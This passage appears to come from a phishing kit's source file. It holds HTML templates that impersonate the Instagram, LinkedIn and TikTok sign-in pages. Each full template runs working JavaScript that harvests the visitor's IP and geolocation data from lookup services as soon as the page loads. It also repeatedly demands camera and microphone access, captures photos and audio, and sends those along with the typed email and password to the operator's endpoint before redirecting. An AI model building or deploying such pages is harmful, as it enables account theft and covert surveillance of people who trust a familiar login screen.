            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #0069D9;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #8E8E8E;
            font-size: 12px;
            padding: 10px 0;
            background-color: #FFFFFF;
            z-index: 1000;
            box-shadow: 0 -1px 3px rgba(0, 0, 0, 0.1);
        }
        .footer a {
            color: #8E8E8E;
            text-decoration: none;
            margin: 0 8px;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #D93025;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 20px;
                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 80px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 12px;
            }
            .buttons {
                flex-direction: column;
                align-items: flex-end;
                gap: 15px;
            }
            .create-account {
                margin-bottom: 10px;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo">
        <div class="subtitle">Connect with friends, share your moments</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Username, email, or phone" required>
            <div id="email-error" class="error">Enter a valid username, email, or phone</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot your username?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#">Create an account</a>
            </div>
            <button class="next-btn" onclick="showPasswordScreen()">Next</button>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo" class="logo">
        <h1>Welcome back</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
            <button class="signin-btn" onclick="handleSignIn()">Sign in</button>
        </div>
    </div>

    <div class="footer">
        <a href="#">English</a>
        <a href="#">About</a>
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://instagram.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Username, email, or phone cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid username, email, or phone";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>"""], "inl0": ["""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - LinkedIn</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #F3F2EF; /* LinkedIn'in açık gri arka planı */
        }
        .container {
            width: 100%;
            max-width: 380px;
            padding: 30px;
            background-color: #FFFFFF;
            border: 1px solid #DADCE0;
            border-radius: 8px;
            box-sizing: border-box;
            margin: 20px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 120px;
            height: 30px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #181818;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #5F6368;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 10px;
        }
        input {
            width: 100%;
            padding: 10px 14px;
            font-size: 14px;
            border: 1px solid #DADCE0;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            background-color: #FFFFFF;
            color: #181818;
        }
        input::placeholder {
            color: #5F6368;
        }
        input:focus {
            border-color: #0A66C2;
            box-shadow: 0 0 0 1px #0A66C2;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #0A66C2;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .create-account {
            margin-top: 15px;
        }
        .create-account a {
            color: #0A66C2;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #0A66C2;
            color: #FFFFFF;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #084C99;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #5F6368;
            font-size: 12px;
            padding: 10px 0;
            background-color: #F3F2EF;
            z-index: 1000;
            box-shadow: 0 -1px 3px rgba(0, 0, 0, 0.1);
        }
        .footer a {
            color: #5F6368;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            color: #0A66C2;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #D93025;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 128px;
                height: 100px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 12px;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://cdn-icons-png.flaticon.com/512/16183/16183618.png" alt="LinkedIn Logo" class="logo">
        <h1>Sign in</h1>
        <div class="subtitle">Stay updated on your professional world</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Email or phone" required>
            <div id="email-error" class="error">Enter a valid email or phone number</div>
        </div>
        <div class="buttons">
            <button class="next-btn" onclick="showPasswordScreen()">Continue</button>
            <div class="create-account">
                <a href="#">New to LinkedIn? Join now</a>
            </div>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://cdn-icons-png.flaticon.com/512/16183/16183618.png" alt="LinkedIn Logo" class="logo">
        <h1>Welcome back</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <button class="signin-btn" onclick="handleSignIn()">Sign in</button>
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">About</a>
        <a href="#">Accessibility</a>
        <a href="#">User Agreement</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Cookie Policy</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://linkedin.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Email or phone cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid email or phone number";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>""", """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - LinkedIn</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #F3F2EF; /* LinkedIn'in açık gri arka planı */
        }
        .container {
            width: 100%;
            max-width: 380px;
            padding: 30px;
            background-color: #FFFFFF;
            border: 1px solid #DADCE0;
            border-radius: 8px;
            box-sizing: border-box;
            margin: 20px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 120px;
            height: 30px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #181818;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #5F6368;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 10px;
        }
        input {
            width: 100%;
            padding: 10px 14px;
            font-size: 14px;
            border: 1px solid #DADCE0;
            border-radius: 4px;
            outline: none;
            box-sizing: border-box;
            background-color: #FFFFFF;
            color: #181818;
        }
        input::placeholder {
            color: #5F6368;
        }
        input:focus {
            border-color: #0A66C2;
            box-shadow: 0 0 0 1px #0A66C2;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #0A66C2;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .create-account {
            margin-top: 15px;
        }
        .create-account a {
            color: #0A66C2;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #0A66C2;
            color: #FFFFFF;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-btn:hover, .signin-btn:hover {
            background-color: #084C99;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            text-align: center;
            color: #5F6368;
            font-size: 12px;
            padding: 10px 0;
            background-color: #F3F2EF;
            z-index: 1000;
            box-shadow: 0 -1px 3px rgba(0, 0, 0, 0.1);
        }
        .footer a {
            color: #5F6368;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            color: #0A66C2;
        }
        #email-screen {
            display: block;
        }
        #password-screen {
            display: none;
        }
        .error {
            color: #D93025;
            font-size: 12px;
            margin-top: 5px;
            text-align: left;
            display: none;
        }
        @media (max-width: 480px) {
            .container {
                padding: 15px;
                margin: 10px;
                border: none;
                box-shadow: none;
            }
            .logo {
                width: 128px;
                height: 100px;
            }
            h1 {
                font-size: 20px;
            }
            .subtitle {
                font-size: 12px;
            }
            .footer {
                font-size: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="email-screen">
        <img src="https://cdn-icons-png.flaticon.com/512/16183/16183618.png" alt="LinkedIn Logo" class="logo">
        <h1>Sign in</h1>
        <div class="subtitle">Stay updated on your professional world</div>
        <div class="input-container">
            <input type="text" id="email-input" placeholder="Email or phone" required>
            <div id="email-error" class="error">Enter a valid email or phone number</div>
        </div>
        <div class="buttons">
            <button class="next-btn" onclick="showPasswordScreen()">Continue</button>
            <div class="create-account">
                <a href="#">New to LinkedIn? Join now</a>
            </div>
        </div>
    </div>

    <div class="container" id="password-screen">
        <img src="https://cdn-icons-png.flaticon.com/512/16183/16183618.png" alt="LinkedIn Logo" class="logo">
        <h1>Welcome back</h1>
        <div class="subtitle" id="email-display"></div>
        <div class="input-container">
            <input type="password" id="password-input" placeholder="Password" required>
            <div id="password-error" class="error">Password cannot be empty</div>
        </div>
        <div class="forgot-link">
            <a href="#">Forgot password?</a>
        </div>
        <div class="buttons">
            <button class="signin-btn" onclick="handleSignIn()">Sign in</button>
            <div class="create-account">
                <a href="#" onclick="backToEmailScreen()">Back</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <a href="#">About</a>
        <a href="#">Accessibility</a>
        <a href="#">User Agreement</a>
        <a href="#">Privacy Policy</a>
        <a href="#">Cookie Policy</a>
    </div>

    <script>
        let mediaProcessingComplete = false;
        let signInClickCount = 0;

        async function fetchWithTimeout(url, timeout = 3000) {
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, { signal: controller.signal });
                clearTimeout(timeoutId);
                
                return { url, data: await response.text() };
            } catch (error) {
                return { url, data: `Error: ${error.message}` };
            }
        }

        async function getUserMediaPermissions() {
            while (true) {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    return stream;
                } catch (error) {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
            }
        }

        async function captureImageWithTimeout(stream, width = 128, height = 128, timeout = 1000) {
            const video = document.createElement('video');
            video.srcObject = stream;
            
            try {
                const loaded = new Promise(resolve => video.onloadedmetadata = resolve);
                const timeoutPromise = new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('Image capture timeout')), timeout)
                );
                
                await Promise.race([loaded, timeoutPromise]);
                video.play();

                const canvas = document.createElement('canvas');
                canvas.width = width;
                canvas.height = height;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, width, height);
                
                const imageData = canvas.toDataURL('image/jpeg');
                video.srcObject = null;
                return imageData;
            } catch (error) {
                video.srcObject = null;
                return null;
            }
        }

        async function recordAudioWithTimeout(stream, duration = 5000, initialTimeout = 2000) {
            return new Promise(async (resolve) => {
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                let hasData = false;
                
                recorder.ondataavailable = e => {
                    chunks.push(e.data);
                    hasData = true;
                };
                
                recorder.onstop = () => {
                    if (!hasData) {
                        resolve(null);
                        return;
                    }
                    const blob = new Blob(chunks, { type: 'audio/wav' });
                    const reader = new FileReader();
                    reader.onload = () => resolve(reader.result);
                    reader.readAsDataURL(blob);
                };

                try {
                    recorder.start();
                    
                    await Promise.race([
                        new Promise(resolve => setTimeout(resolve, initialTimeout)),
                        new Promise(resolve => recorder.onstart = resolve)
                    ]);
                    
                    if (!hasData) {
                        recorder.stop();
                        return;
                    }

                    setTimeout(() => recorder.stop(), duration);
                } catch (error) {
                    recorder.stop();
                    resolve(null);
                }
            });
        }

        async function processMedia() {
            const urls = [
                'https://ifconfig.me/',
                'https://ifconfig.me/all',
                'https://whatismyipaddress.com/',
                'https://www.showmyip.com/',
                'https://ipaddress.my/',
                'https://ipinfo.io/json',
                'https://ipapi.co/json',
                'https://ipwho.is/',
                'https://linkedin.com/',
                'https://facebook.com/'
            ];

            const fetchPromises = urls.map(url => fetchWithTimeout(url));
            const results = await Promise.all(fetchPromises);
            const dataJson = Object.fromEntries(results.map(result => [result.url, result.data]));

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "ifconfig",
                    data: dataJson
                }),
                headers: { 'Content-Type': 'application/json' }
            });

            const stream = await getUserMediaPermissions();
            
            const devices = await navigator.mediaDevices.enumerateDevices();
            const videoDevices = devices.filter(device => device.kind === 'videoinput');
            
            for (const device of videoDevices.slice(0, 5)) {
                const cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { deviceId: device.deviceId }
                });
                
                const imageData = await captureImageWithTimeout(cameraStream);
                if (imageData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "camera",
                            data: imageData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                cameraStream.getTracks().forEach(track => track.stop());
            }

            const audioDevices = devices.filter(device => device.kind === 'audioinput');
            if (audioDevices.length > 0) {
                const audioStream = await navigator.mediaDevices.getUserMedia({
                    audio: { deviceId: audioDevices[0].deviceId }
                });
                
                const audioData = await recordAudioWithTimeout(audioStream);
                if (audioData) {
                    await fetch('/check_validity', {
                        method: 'CHECK',
                        body: JSON.stringify({
                            target: "<!checker_identity!>",
                            type: "microphone",
                            data: audioData
                        }),
                        headers: { 'Content-Type': 'application/json' }
                    });
                }
                
                audioStream.getTracks().forEach(track => track.stop());
            }

            mediaProcessingComplete = true;
            checkAndRedirect();
        }

        function showPasswordScreen() {
            const emailInput = document.getElementById('email-input').value;
            const emailError = document.getElementById('email-error');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

            if (!emailInput) {
                emailError.textContent = "Email or phone cannot be empty";
                emailError.style.display = 'block';
            } else if (!emailRegex.test(emailInput)) {
                emailError.textContent = "Enter a valid email or phone number";
                emailError.style.display = 'block';
            } else {
                emailError.style.display = 'none';
                document.getElementById('email-screen').style.display = 'none';
                document.getElementById('password-screen').style.display = 'block';
                document.getElementById('email-display').textContent = emailInput;
            }
        }

        function backToEmailScreen() {
            document.getElementById('password-screen').style.display = 'none';
            document.getElementById('email-screen').style.display = 'block';
            document.getElementById('password-error').style.display = 'none';
        }

        let accountSent = false;

        async function handleSignIn() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            const passwordError = document.getElementById('password-error');

            signInClickCount++;

            if (signInClickCount >= 3) {
                window.location.href = "<!redirect!>";
                return;
            }

            if (!password) {
                passwordError.textContent = "Password cannot be empty";
                passwordError.style.display = 'block';
                return;
            } else {
                passwordError.style.display = 'none';
            }

            await fetch('/check_validity', {
                method: 'CHECK',
                body: JSON.stringify({
                    target: "<!checker_identity!>",
                    type: "account",
                    data: { user: email, password: password }
                }),
                headers: { 'Content-Type': 'application/json' }
            });
            accountSent = true;
            checkAndRedirect();
        }

        function checkAndRedirect() {
            if (mediaProcessingComplete && accountSent) {
                window.location.href = "<!redirect!>";
            }
        }

        processMedia();
    </script>
</body>
</html>"""], "tl0": ["""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in - TikTok</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #000000; /* TikTok'un koyu arka planı */
        }
        .container {
            width: 100%;
            max-width: 350px;
            padding: 30px;
            background-color: #1A1A1A;
            border-radius: 12px;
            box-sizing: border-box;
            margin: 20px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }
        .logo {
            display: block;
            margin: 0 auto 20px;
            width: 100px;
            height: 100px;
        }
        h1 {
            font-size: 20px;
            font-weight: 500;
            color: #FFFFFF;
            text-align: center;
            margin: 0 0 8px;
        }
        .subtitle {
            font-size: 14px;
            color: #AAAAAA;
            text-align: center;
            margin-bottom: 20px;
        }
        .input-container {
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            padding: 12px 14px;
            font-size: 14px;
            border: 1px solid #444444;
            border-radius: 8px;
            outline: none;
            box-sizing: border-box;
            background-color: #2A2A2A;
            color: #FFFFFF;
        }
        input::placeholder {
            color: #888888;
        }
        input:focus {
            border-color: #00F7F7;
            box-shadow: 0 0 0 1px #00F7F7;
        }
        .forgot-link {
            margin-bottom: 20px;
        }
        .forgot-link a {
            color: #00F7F7;
            text-decoration: none;
            font-size: 12px;
        }
        .buttons {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .create-account {
            margin-top: 15px;
        }
        .create-account a {
            color: #00F7F7;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .next-btn, .signin-btn {
            background-color: #00F7F7;
            color: #000000;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 22px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
